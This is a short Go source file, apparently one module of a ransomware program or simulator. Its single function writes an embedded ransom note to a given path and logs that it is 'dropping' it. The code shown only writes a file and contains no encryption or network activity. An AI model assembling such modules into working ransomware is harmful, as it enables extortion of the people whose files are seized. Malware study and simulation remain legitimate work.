package note

import (
	_ "embed"
	"log"
	"os"
)

//go:embed note.txt
var note string

func Write(location string) error {
	log.Printf("Dropping ransomware note to %s...", location)
	file, err := os.Create(location)
	if err != nil {
		return err
	}
	defer file.Close()
	file.WriteString(note)
	return nil
}